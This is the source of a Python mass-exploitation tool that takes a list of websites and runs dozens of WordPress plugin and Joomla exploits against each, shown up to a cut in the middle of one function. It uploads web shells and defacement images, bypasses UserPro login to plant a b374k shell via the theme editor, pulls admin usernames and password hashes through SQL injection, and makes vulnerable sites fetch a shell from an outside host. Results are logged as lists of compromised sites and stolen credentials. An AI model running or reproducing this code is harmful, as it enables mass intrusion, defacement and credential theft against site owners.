# coding=utf-8
# Work on Python3.x And Python2.x
import os, re, sys, time, json, random, threading

try:
    from queue import Queue
except ImportError:
    from Queue import Queue

try:
    import requests
except ImportError:
    print('---------------------------------------------------')
    print('[*] pip install requests')
    print('   [-] you need to install requests Module')
    sys.exit()


class AutoExploiter(object):
    def __init__(self):
        try:
            os.mkdir('result')
        except:
            pass
        try:
            os.mkdir('logs')
        except:
            pass
        self.r = '\033[31m'
        self.g = '\033[32m'
        self.y = '\033[33m'
        self.b = '\033[34m'
        self.m = '\033[35m'
        self.c = '\033[36m'
        self.w = '\033[37m'
        self.Headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.shell_code = open('files/shcode.txt', 'rb').read().splitlines()
        self.version = '2.5'
        self.year = time.strftime("%y")
        self.month = time.strftime("%m")
        self.EMail = 'email@email.com'       # --> Put Your Email Address here
        self.Jce_Deface_image = 'files/pwn.gif'
        self._shell = 'files/shell.jpg'
        self.indeX = 'files/index.jpg'
        self.TextindeX = 'files/vuln.txt'
        self.MailPoetZipShell = 'files/rock.zip'
        self.ZipJd = 'files/jdownlods.zip'
        self.pagelinesExploitShell = 'files/settings_auto.php'
        self.jdShell = 'files/vuln.php3.j'
        self.ShellPresta = 'files/up.php'
        self.gravShell = 'files/grav.jpg'
        self.JoomRCEB6 = open('files/base64RCE.txt', 'rb').read().splitlines()
        try:
            self.select = sys.argv[1]
        except:
            self.cls()
            self.print_logo()
            self.Print_options()
            sys.exit()
        
        if True:  # multi List
            self.cls()
            try:
                self.print_logo()
                try:
                    Get_list = input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
                except:
                    Get_list = input(self.r + '    [+]' + self.c + ' Enter List Websites: ' + self.y)
                Readlist = open(Get_list, 'r').read().splitlines()
            except IOError:
                print(self.r + '--------------------------------------------')
                print(self.r + '    [' + self.y + '-' + self.r + '] ' + self.c + ' List Not Found in Directory!')
                sys.exit()
            thread = []
            for site in Readlist:
                #print(site)
                t = threading.Thread(target=self.Work2, args=(site, ''))
                t.start()
                thread.append(t)
                time.sleep(0.08)
            for j in thread:
                j.join()
        
        

        else:
            self.cls()
            self.print_logo()
            print(self.r + '--------------------------------------------')
            print(self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + ' Option Not Found! Try Again...')

    def Work2(self, url, s):
        try:
            if url.startswith("http://"):
                url = url.replace("http://", "")
            elif url.startswith("https://"):
                url = url.replace("https://", "")
            else:
                pass
            
            Checktwo = requests.get('http://' + url, timeout=5, headers=self.Headers)
            
            if '/wp-content/' in Checktwo.text:
                self.Revslider_SHELL(url)
                self.wysijaExploit(url)
                self.WP_User_Frontend(url)
                self.Gravity_Forms_Shell(url)
                self.HD_WebPlayerSqli(url)
                self.pagelinesExploit(url)
                self.HeadWayThemeExploit(url)
                self.addblockblocker(url)
                self.cherry_plugin(url)
                self.formcraftExploit_Shell(url)
                self.UserProExploit(url)
                self.wp_mobile_detector(url)
                self.Wp_Job_Manager(url)
                self.wp_content_injection(url)
                self.viral_optins(url)
                self.PlugineBook(url)
                self.CateGory_page_icons(url)
                self.Downloads_Manager(url)
                self.wp_support_plus_responsive_ticket_system(url)
                self.wp_miniaudioplayer(url)
                self.eshop_magic(url)
                self.ungallery(url)
                self.barclaycart(url)
                self.wp_gdpr_compliance(url)
                self.FckEditor(url)
                self.PluginBackgroundTakeover(url)
                self.PluginSEHTML5(url)
                self.PluginPaidMemberships(url)
                self.PluginWPDBBac(url)
                self.WordPressCore(url)
                self.PluginSEO(url)
                self.Wordpress(url)
               
            else:
                pass    
            
        except:
            pass

   
        

    def print_logo(self):
        clear = "\x1b[0m"
        colors = [36, 32, 34, 35, 31, 37]

        x = """
                                                                                                    
 (  (                (                 )                                      (                  )  
 )\))(   '           )\        (    ( /(                 (        )           )\         (    ( /(  
((_)()\ )  `  )   ((((_)(     ))\   )\())   (            )\    ( /(   `  )   ((_)   (    )\   )\()) 
_(())\_)() /(/(    )\ _ )\   /((_) (_))/    )\          ((_)   )\())  /(/(    _     )\  ((_) (_))/  
\ \((_)/ /((_)_\   (_)_\(_) (_))(  | |_    ((_)         | __| ((_)\  ((_)_\  | |   ((_)  (_) | |_   
 \ \/\/ / | '_ \)   / _ \   | || | |  _|  / _ \         | _|  \ \ /  | '_ \) | |  / _ \  | | |  _|  
  \_/\_/  | .__/   /_/ \_\   \_,_|  \__|  \___/  _____  |___| /_\_\  | .__/  |_|  \___/  |_|  \__|  
          |_|                                   |_____|              |_|                             
    """
        for N, line in enumerate(x.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
            time.sleep(0.05)


    def Print_options(self):
        print(self.r + '    [' + self.y + '2' + self.r + '] ' + self.c + 'List Scan' + self.w + '         [ '
              + 'python exwp.py ' + ' ]')
      



    def Print_Scanning(self, url, CMS):
        print(self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + url + self.w + ' [ ' + CMS + ' ]')


    def Timeout(self, url):
        print(self.r + '    [' + self.y + '*' + self.r + '] ' + self.c + url + self.r + ' [ TimeOut!!/NotValid Url ]')

    def Print_NotVuln(self, NameVuln, site):
        print(self.c + '       [' + self.y + '-' + self.c + '] '
              + self.r + site + ' ' + self.y + NameVuln + self.c + ' [Not Vuln]')

    def Print_Username_Password(self, username, Password):
        print(self.y + '           [' + self.c + '+' + self.y + '] ' + self.c + 'Username: ' + self.g + username)
        print(self.y + '           [' + self.c + '+' + self.y + '] ' + self.c + 'Password: ' + self.g + Password)


    def Print_Vuln(self, NameVuln, site):
        print(self.c + '       [' + self.y + '+' + self.c + '] ' + self.r + site + ' ' +
              self.y + NameVuln + self.g + ' [Vuln!!]')

    def Print_Vuln_index(self, indexPath):
        print(self.c + '       [' + self.y + '+' + self.c + '] ' + self.y + indexPath + self.g + ' [Index Uploaded!]')

    def Print_vuln_Shell(self, shellPath):
        print(self.c + '       [' + self.y + '+' + self.c + '] '
              + self.y + shellPath + self.g + ' [Shell Uploaded!]')

    def Print_vuln_Config(self, pathconfig):
        print(self.c + '       [' + self.y + '+' + self.c + '] '
              + self.y + pathconfig + self.g + ' [Config Downloaded!]')

    def AdminTakeOver(self, NameVuln, site):
        print(self.c + '       [' + self.y + '+' + self.c + '] ' + self.r + site + ' ' +
              self.y + NameVuln + self.g + ' [Admin Taked]')

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    

    def php_str_noquotes(self, data):
        try:
            encoded = ""
            for char in data:
                encoded += "chr({0}).".format(ord(char))
            return encoded[:-1]
        except:
            pass

    def generate_payload(self, php_payload):
        try:
            php_payload = "eval({0})".format(php_payload)
            terminate = '\xf0\xfd\xfd\xfd';
            exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory"
            :0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"J
            DatabaseDriverMysql":0:{}s:8:"feed_url";'''
            injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
            exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
            exploit_template += r''';s:19:"cache_name_function";s:6:
            "assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatab
            aseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connec
            tion";b:1;}''' + terminate
            return exploit_template
        except:
            pass

    

    
    
    


    


    def CateGory_page_icons(self, site):
        try:
            ChckVln = requests.get('http://' + site + '/wp-content/plugins/category-page-icons/css/menu.css',
                                   timeout=5, headers=self.Headers)
            if ChckVln.status_code == 200:
                Exp = 'http://' + site + '/wp-content/plugins/category-page-icons/include/wpdev-flash-uploader.php'
                fileDeface = {'wpdev-async-upload': open(self.Jce_Deface_image, 'rb')}
                PostDAta = {'dir_icons': '../../../',
                            'submit': 'upload'}
                requests.post(Exp, files=fileDeface, data=PostDAta, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/wp-content/' + self.Jce_Deface_image.split('/')[1],
                                          timeout=5, headers=self.Headers)
                if 'GIF89a' in CheckIndex.text:
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1] + '\n')
                    self.Print_Vuln_index(site + '/wp-content/' + self.Jce_Deface_image.split('/')[1])
                else:
                    self.Print_NotVuln('CateGory_page_icons', site)
            else:
                self.Print_NotVuln('CateGory_page_icons', site)
        except:
            self.Print_NotVuln('CateGory_page_icons', site)


    def Downloads_Manager(self, site):
        try:
            Checkvuln = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/img/unlock.gif',
                                     timeout=5, headers=self.Headers)
            if 'GIF89a' in Checkvuln.text:
                PostDAta = {'dm_upload': ''}
                fileDeface = {'upfile': open(self.Jce_Deface_image, 'rb')}
                fileShell = {'upfile': open(self.pagelinesExploitShell, 'rb')}
                requests.post('http://' + site, data=PostDAta, files=fileDeface, timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                          self.Jce_Deface_image.split('/')[1])
                if 'GIF89a' in CheckIndex.text:
                    requests.post('http://' + site, data=PostDAta, files=fileShell, timeout=5, headers=self.Headers)
                    requests.get('http://' + site + '/wp-content/plugins/downloads-manager/upload/' +
                                 self.pagelinesExploitShell.split('/')[1], timeout=5, headers=self.Headers)
                    CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                              timeout=5, headers=self.Headers)
                    if 'Vuln!!' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.pagelinesExploitShell.split('/')[1])
                        self.Print_Vuln_index(site + '/vuln.htm')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.pagelinesExploitShell.split('/')[1] + '\n')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/downloads-manager/upload/' +
                                              self.Jce_Deface_image.split('/')[1])
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/downloads-manager/upload/' +
                                         self.Jce_Deface_image.split('/')[1] + '\n')
                else:
                    self.Print_NotVuln('Downloads-Manager', site)
            else:
                self.Print_NotVuln('Downloads-Manager', site)
        except:
            self.Print_NotVuln('Downloads-Manager', site)


    def GetWordpressPostId(self, zzz):
        try:
            PostId = requests.get('http://' + zzz + '/wp-json/wp/v2/posts/', timeout=5, headers=self.Headers)
            wsx = re.findall('"id":(.+?),"date"', PostId.text)
            postid = wsx[1].strip()
            return postid
        except:
            pass

    def wp_content_injection(self, site):
        try:
            zaq = self.GetWordpressPostId(site)
            headers = {'Content-Type': 'application/json',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0'}
            xxx = str(zaq) + 'bbx'
            data = json.dumps({
                'content': '<h1>Vuln!! Path it now!!\n<p><title>Vuln!! Path it now!!<br />\n</title></p></h1>\n',
                'title': 'Vuln!! Path it now!!',
                'id': xxx,
                'link': '/x-htm/',
                'slug': '"/x-htm/"'
            })
            GoT = requests.post('http://' + site + '/wp-json/wp/v2/posts/' + str(zaq), data=data,
                                headers=headers, timeout=10)
            if GoT:
                CheckIndex = 'http://' + site + '/x.htm'
                zcheck = requests.get(CheckIndex, timeout=10, headers=self.Headers)
                if 'Vuln!!' in zcheck.text:
                    self.Print_Vuln_index(site + '/x.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/x.htm' + '\n')
                else:
                    self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
            else:
                self.Print_NotVuln('Wordpress 4.7 Content Injection', site)
        except:
            self.Print_NotVuln('Wordpress 4.7 Content Injection', site)

    def Wp_Job_Manager(self, site):
        try:
            Exploit = '/jm-ajax/upload_file/'
            CheckVuln = requests.get('http://' + site + Exploit, timeout=5, headers=self.Headers)
            if '"files":[]' in CheckVuln.text:
                try:
                    IndeXfile = {'file[]': open(self.Jce_Deface_image, 'rb')}
                    GoT = requests.post('http://' + site + Exploit, files=IndeXfile, timeout=5, headers=self.Headers)
                    GetIndeXpath = re.findall('"url":"(.*)"', GoT.text)
                    IndeXpath = GetIndeXpath[0].split('"')[0].replace('\/', '/').split('/wp-content')[1]
                    UploadedIndEX = site + '/wp-content' + IndeXpath
                    Checkindex = requests.get('http://' + UploadedIndEX, timeout=5, headers=self.Headers)
                    if 'GIF89a' in Checkindex.text:
                        self.Print_Vuln_index(UploadedIndEX)
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(UploadedIndEX + '\n')
                    else:
                        self.Print_NotVuln('Wp-Job-Manager', site)
                except:
                    self.Print_NotVuln('Wp-Job-Manager', site)
            else:
                self.Print_NotVuln('Wp-Job-Manager', site)
        except:
            self.Print_NotVuln('Wp-Job-Manager', site)


    def wp_mobile_detector(self, site):
        try:
            ExploitShell = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'http://40k.waszmann.de/Deutsch/images/settings_auto.php'
            ExploitGifUpload = '/wp-content/plugins/wp-mobile-detector/resize.php?src=' \
                           'http://40k.waszmann.de/Deutsch/images/pwn.gif'

            Ex = '/wp-content/plugins/wp-mobile-detector/resize.php'
            GoT = requests.get('http://' + site + Ex, timeout=5, headers=self.Headers)
            if 'GIF89a' in GoT.text:
                requests.get('http://' + site + ExploitGifUpload, timeout=10, headers=self.Headers)
                requests.get('http://' + site + ExploitShell, timeout=10, headers=self.Headers)
                PathGif = '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif'
                PathShell = '/wp-content/plugins/wp-mobile-detector/cache/settings_auto.php'
                Check1 = 'http://' + site + PathGif
                Check2 = 'http://' + site + PathShell
                CheckIndex = requests.get(Check1, timeout=5, headers=self.Headers)
                if 'GIF89a' in CheckIndex.text:
                    CheckShell = requests.get(Check2, timeout=5, headers=self.Headers)
                    if 'Vuln!!' in CheckShell.text:
                        Xshell = requests.get("http://" + site + "/wp-content/vuln.php",
                                              timeout=5, headers=self.Headers)
                        if 'Vuln!!' in Xshell.text:
                            self.Print_vuln_Shell(site + "/wp-content/vuln.php")
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + "/wp-content/vuln.php" + '\n')
                        Xindex = requests.get("http://" + site + "/vuln.htm", timeout=5, headers=self.Headers)
                        if 'Vuln!!' in Xindex.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                    else:
                        self.Print_Vuln_index(site + '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/plugins/wp-mobile-detector/cache/pwn.gif' + '\n')
                else:
                    self.Print_NotVuln('wp-mobile-detector', site)
            else:
                self.Print_NotVuln('wp-mobile-detector', site)
        except:
            self.Print_NotVuln('wp-mobile-detector', site)

    def get_WpNoncE(self, source):
        try:
            find = re.findall('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)"', source)
            path = find[0].strip()
            return path
        except:
            pass

    def get_WpFlag(self, source):
        try:
            find = re.findall('<option value="(.*?)" selected="selected">', source)
            path = find[0].strip()
            return path
        except:
            pass

    def UserProExploit(self, site):
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
                       'Accept': '*/*'}
            exploit = '/?up_auto_log=true'
            sess = requests.session()
            sess.get('http://' + site, timeout=10, headers=headers)
            admin_re_page = 'http://' + site + '/wp-admin/'
            sess.get('http://' + site + exploit, timeout=10, headers=headers)
            Check_login = sess.get(admin_re_page, timeout=10, headers=headers)
            if '<li id="wp-admin-bar-logout">' in Check_login.text:
                self.AdminTakeOver('Userpro', site)
                with open('result/AdminTakeover_results.txt', 'a') as writer:
                    writer.write(site + exploit + '\n')
                ___Get_editor = admin_re_page + 'theme-editor.php?file=search.php#template'
                ___Get_edit = admin_re_page + 'theme-editor.php'
                Get_source = sess.get(___Get_editor, headers=headers, timeout=5)
                source = Get_source.text
                _Wp_FlaG = self.get_WpFlag(source)
                _Wp_NoncE = self.get_WpNoncE(source)
                __data = {'_wpnonce': _Wp_NoncE,
                          '_wp_http_referer': '/wp-admin/theme-editor.php?file=search.php',
                          'newcontent': self.shell_code,
                          'action': 'update',
                          'file': 'search.php',
                          'theme': _Wp_FlaG,
                          'scrollto': '0',
                          'docs-list': '',
                          'submit': 'Update+File'}
                sess.post(___Get_edit, data=__data, headers=headers)
                shell_PaTh = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + "/search.php"
                Check_sHell = sess.get(shell_PaTh, headers=headers)
                if 'wordpress_project' in Check_sHell.text:
                    __po = {'_upl': 'Upload'}
                    fil = {'file': open('Access.php', 'rb')}
                    requests.post(shell_PaTh, data=__po, files=fil, headers=headers)
                    shell_PaTh_DoNe = 'http://' + site + "/wp-content/themes/" + _Wp_FlaG + '/Access.php'
                    Got_Shell = requests.get(shell_PaTh_DoNe, timeout=5, headers=headers)
                    if 'b374k' in Got_Shell.text:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php")
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/Access.php" + '\n')
                    else:
                        self.Print_vuln_Shell(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php")
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + "/wp-content/themes/" + _Wp_FlaG + "/search.php" + '\n')
            else:
                self.Print_NotVuln('UserPro', site)
        except:
            self.Print_NotVuln('UserPro', site)


    def formcraftExploit_Shell(self, site):
        try:
            ShellFile = {'files[]': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5, headers=self.Headers)
            if '"failed"' in Check.text:
                GoT = requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
                if 'new_name' in GoT.text:
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text)
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                    if CheckIndex.status_code == 200:
                        CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                  timeout=5, headers=self.Headers)
                        CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        if 'Vuln!!' in CheckShell.text:
                            self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/vuln.php' + '\n')
                        if 'Vuln!!' in CheckIndex.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        else:
                            self.formcraftExploitIndeX(site)
                    else:
                        self.formcraftExploitIndeX(site)
                else:
                    self.formcraftExploitIndeX(site)
            else:
                self.formcraftExploitIndeX(site)
        except:
            self.formcraftExploitIndeX(site)

    def formcraftExploitIndeX(self, site):
        try:
            ShellFile = {'files[]': open(self.Jce_Deface_image, 'rb')}
            Exp = 'http://' + site + '/wp-content/plugins/formcraft/file-upload/server/content/upload.php'
            Check = requests.get(Exp, timeout=5, headers=self.Headers)
            if '"failed"' in Check.text:
                GoT = requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
                if 'new_name' in GoT.text:
                    GetIndexName = re.findall('"new_name":"(.*)",', GoT.text)
                    IndexPath = site + '/wp-content/plugins/formcraft/file-upload/server/content/files/'\
                                + GetIndexName[0].split('"')[0]
                    CheckIndex = requests.get('http://' + IndexPath, timeout=5, headers=self.Headers)
                    if 'GIF89a' in CheckIndex.text:
                        self.Print_Vuln_index(IndexPath)
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(IndexPath + '\n')
                    else:
                        self.Print_NotVuln('formcraft', site)
                else:
                    self.Print_NotVuln('formcraft', site)
            else:
                self.Print_NotVuln('formcraft', site)
        except:
            self.Print_NotVuln('formcraft', site)



    def cherry_plugin(self, site):
        try:
            ShellFile = {'file': (self.pagelinesExploitShell, open(self.pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
            Exp = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/upload.php'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            Shell = 'http://' + site + '/wp-content/plugins/cherry-plugin/admin/import-export/' \
                    + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(Shell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'Vuln!!' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'Vuln!!' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('cherry plugin', site)
            else:
                self.Print_NotVuln('cherry plugin', site)
        except:
            self.Print_NotVuln('cherry plugin', site)

    def addblockblocker(self, site):
        try:
            ShellFile = {'popimg': open(self.pagelinesExploitShell, 'rb')}
            Exp = 'http://' + site + '/wp-admin/admin-ajax.php?action=getcountryuser&cs=2'
            requests.post(Exp, files=ShellFile, timeout=5, headers=self.Headers)
            CheckShell = 'http://' + site + '/wp-content/uploads/20' + self.year + '/' + self.month + '/' \
                         + self.pagelinesExploitShell.split('/')[1]
            GoT = requests.get(CheckShell, timeout=5, headers=self.Headers)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'Vuln!!' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'Vuln!!' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('Adblock Blocker', site)
            else:
                self.Print_NotVuln('Adblock Blocker', site)
        except:
            self.Print_NotVuln('Adblock Blocker', site)

    def HeadWayThemeExploit(self, site):
        try:
            CheckTheme = requests.get('http://' + site, timeout=5, headers=self.Headers)
            if '/wp-content/themes/headway' in CheckTheme.text:
                ThemePath = re.findall('/wp-content/themes/(.*)/style.css', CheckTheme.text)
                ShellFile = {'Filedata': open(self.pagelinesExploitShell, 'rb')}
                useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

                url = "http://" + site + "/wp-content/themes/" + ThemePath[0] +\
                      "/library/visual-editor/lib/upload-header.php"
                Check = requests.get(url, timeout=5, headers=self.Headers)
                if Check.status_code == 200:
                    GoT = requests.post(url, files=ShellFile, headers=useragent)
                    if GoT.status_code == 200:
                        Shell_URL = 'http://' + site + '/wp-content/uploads/headway/header-uploads/' +\
                                    self.pagelinesExploitShell.split('/')[1]
                        requests.get(Shell_URL, timeout=5, headers=self.Headers)
                        CheckShell = requests.get('http://' + site + '/wp-content/vuln.php',
                                                  timeout=5, headers=self.Headers)
                        CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                        if 'Vuln!!' in CheckShell.text:
                            self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                            with open('result/Shell_results.txt', 'a') as writer:
                                writer.write(site + '/wp-content/vuln.php' + '\n')
                        if 'Vuln!!' in CheckIndex.text:
                            self.Print_Vuln_index(site + '/vuln.htm')
                            with open('result/Index_results.txt', 'a') as writer:
                                writer.write(site + '/vuln.htm' + '\n')
                        else:
                            self.Print_NotVuln('Headway Theme', site)
                    else:
                        self.Print_NotVuln('Headway Theme', site)
                else:
                    self.Print_NotVuln('Headway Theme', site)
            else:
                self.Print_NotVuln('Headway Theme', site)
        except:
            self.Print_NotVuln('Headway Theme', site)


    def pagelinesExploit(self, site):
        try:
            FileShell = {'file': open(self.pagelinesExploitShell, 'rb')}
            PostData = {'settings_upload': "settings", 'page': "pagelines"}
            Useragent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
            url = "http://" + site + "/wp-admin/admin-post.php"
            GoT = requests.post(url, files=FileShell, data=PostData, headers=Useragent, timeout=5)
            if GoT.status_code == 200:
                CheckShell = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5, headers=self.Headers)
                CheckIndex = requests.get('http://' + site + '/vuln.htm', timeout=5, headers=self.Headers)
                if 'Vuln!!' in CheckShell.text:
                    self.Print_vuln_Shell(site + '/wp-content/vuln.php')
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/wp-content/vuln.php' + '\n')
                if 'Vuln!!' in CheckIndex.text:
                    self.Print_Vuln_index(site + '/vuln.htm')
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.htm' + '\n')
                else:
                    self.Print_NotVuln('Pagelines', site)
            else:
                self.Print_NotVuln('Pagelines', site)
        except:
            self.Print_NotVuln('Pagelines', site)


    def wysijaExploit(self, site):
            try:
                FileShell = {'my-theme': open(self.MailPoetZipShell, 'rb')}
                PostData = {'action': "themeupload", 'submitter': "Upload", 'overwriteexistingtheme': "on",
                        'page': 'GZNeFLoZAb'}
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                url = "http://" + site + "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes"
                GoT = requests.post(url, files=FileShell, data=PostData, headers=UserAgent, timeout=10)
                if 'page=wysija_campaigns&amp;action=themes&amp;reload=1' in GoT.text:
                    sh = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/vuln.php'
                    index = 'http://' + site + '/wp-content/uploads/wysija/themes/rock/pwn.gif'
                    CheckShell = requests.get(sh, timeout=5, headers=self.Headers)
                    CheckIndex = requests.get(index, timeout=5, headers=self.Headers)
                    if 'Vuln!!' in CheckShell.text:
                        self.Print_vuln_Shell(site + '/wp-content/uploads/wysija/themes/rock/vuln.php')
                        with open('result/Shell_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/rock/vuln.php' + '\n')
                    if 'GIF89a' in CheckIndex.text:
                        self.Print_Vuln_index(site + '/wp-content/uploads/wysija/themes/rock/pwn.gif')
                        with open('result/Index_results.txt', 'a') as writer:
                            writer.write(site + '/wp-content/uploads/wysija/themes/rock/pwn.gif' + '\n')
                    else:
                        self.Print_NotVuln('wysija', site)
                else:
                    self.Print_NotVuln('wysija', site)
            except:
                self.Print_NotVuln('wysija', site)



    def HD_WebPlayerSqli(self, site):
        try:
            check = requests.get('http://' + site + '/wp-content/plugins/hd-webplayer/playlist.php',
                                 timeout=5, headers=self.Headers)
            if '<?xml version="' in check.text:
                Exploit = '/wp-content/plugins/hd-webplayer/playlist.php' \
                          '?videoid=1+union+select+1,2,concat(user_login,0x3a,user_pass)' \
                          ',4,5,6,7,8,9,10,11+from+wp_users--'
                GoT = requests.get('http://' + site + Exploit, timeout=5, headers=self.Headers)
                User_Pass = re.findall('<title>(.*)</title>', GoT.text)
                username = User_Pass[1].split(':')[0]
                password = User_Pass[1].split(':')[1]
                self.Print_Vuln('HD-Webplayer', site)
                self.Print_Username_Password(username, password)
                with open('result/Sqli_result.txt', 'a') as writer:
                    writer.write('------------------------------' + '\n' + 'Domain: ' + site + '\n' +
                                 'Username : ' + username + '\n' + 'Password : ' + password + '\n')
            else:
                self.Print_NotVuln('HD-Webplayer', site)
        except:
            self.Print_NotVuln('HD-Webplayer', site)


    def Gravity_Forms_Shell(self, site):
        try:
            Grav_checker = requests.get('http://' + site + '/?gf_page=upload', timeout=5, headers=self.Headers)
            if '"status" : "error"' in Grav_checker.text:
                UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
                fileDeface = {'file': open(self.gravShell, 'rb')}
                post_data = {'field_id': '3', 'form_id': '1', 'gform_unique_id': '../../../../', 'name': 'css.php5'}
                try:
                    url = "http://" + site + '/?gf_page=upload'
                    GoT = requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
                    if '.php5' in GoT.text:
                        CheckShell = requests.get('http://' + site + '/wp-content/_input_3_css.php5',
                                                  timeout=5, headers=self.Headers)
                        if 'Vuln!!' in CheckShell.text:
                            Checkshell2 = requests.get('http://' + site + '/wp-content/vuln.php', timeout=5,
                                                       headers=self.Headers)
                            if 'Vuln!!' in Checkshell2.text:
